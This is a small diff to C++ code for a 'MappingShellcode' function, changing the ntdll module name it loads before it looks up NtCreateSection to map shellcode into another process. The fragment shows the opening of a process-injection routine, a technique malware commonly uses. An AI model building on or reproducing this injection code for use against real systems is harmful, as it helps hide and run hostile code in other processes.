@@ -3,7 +3,7 @@
 #include <iostream>
 
 bool MappingShellcode(_In_ HANDLE hTargetProcess,_In_ LPVOID lpShellcode,_In_ DWORD dwShellSize, _Out_ LPVOID* lpRemoteAddr) {
-	HMODULE hNtdll = GetModuleHandleA("ntdll");
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 	if (hNtdll == nullptr) { return false; }
 	pNtCreateSection ntCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
 	if (ntCreateSection == nullptr) { return false; }
